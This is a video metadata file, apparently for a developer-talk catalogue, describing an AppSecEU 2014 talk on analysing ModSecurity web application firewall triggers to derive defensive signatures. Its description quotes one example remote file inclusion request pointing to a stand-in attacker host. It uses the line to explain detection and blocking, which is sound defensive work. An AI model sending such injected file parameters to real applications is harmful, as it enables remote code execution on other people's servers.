# Editing guidelines: https://github.com/watch-devtube/contrib/#how-to-edit-video-metadata

tags:
    - bigdata
    - php
    - cloud
    - security
title: 'OrKatz - Getting New Actionable Insights by Analyzing Web Application Firewall Triggers'
language: English
recordingDate: 1404393950
description: "From AppSecEU 2014 in Cambridge\nhttps://2014.appsec.eu/\n\nModSecurity Web Application Firewall was first released more than a decade ago, available as open source software that gives the ability to protect web applications. Over the years ModSecurity has matured significantly, and is the most widely deployed WAF, protecting millions of websites. A long side ModSecurity engine we can also find OWASP ModSecurity Core Rule Set (CRS), which is a library of generic application security signatures that provide a base level of protection for any web application.\n\nIn this presentation I will show an advanced technique for post processing of ModSecurity Core Rule Set WAF triggers in order to generate actionable defenses that are derived from WAF triggers. The objective of the post processing is to improve security controls. Based on the collected malicious HTTP traffic we can produce new insights on our attackers and the techniques they use and as a result we can harden defenses that will improve our mitigations.\n\nThe presentation will include detailed description of several techniques with case studies based on real traffic from Akamai's security big data platform (Cloud Security Intelligence).\n\nExample for analysis on remote file inclusion attack:\n\nWhen analyzing the payload of a remote file inclusion attack we will find a link to a remote source code file the attackers are trying to inject into the vulnerable application.\nThe injected remote source file is in many cases a static \"anchor\" in a continues attack campaign that uses various RFI vulnerabilities with the same remote file.\n\nGenerating signature that matches attacks based on the attack \"anchor\" can improve the detection capabilities for ModSecurity CRS and at the same time give better insight on the threat landscape.\nMore than that, this \"anchor\" can be used as enrichment for other security controls that monitor URL and domain reputation.\n\nRFI attack:\n\nhttp://www.target.com/vuln_page.php?file=http://www.attacker.com/malicous.php\n\nIn the attack above we can see remote source file located on \"www.attacker.com/malicous.php\", using this malicious file can be valuable when:\n\n\n\nLooking for the same link on HTTP traffic (complementary to ModSecurity CRS rules)\n\n\n\nBlocking traffic from within the organization to the attacker web application\n\n\n\nCorrelating similar attacks as same distributed attack campaign \n\n\nSpeakers\n\nOr Katz\nPrincipal Security Researcher, Akamai\nOr is an application security veteran, with years of experience at industry leading vendors such as Trustwave and F5 Networks. Or currently serves as principal security researcher for Akamai's Cloud Security Intelligence platform. Or is a frequent speaker in conferences such as RSA, OWASP and Akamai Edge, and also has published several innovative white papers on web applications defensive techniques.\n\n\n-\n\nManaged by the official OWASP Media Project https://www.owasp.org/index.php/OWASP_Media_Project"
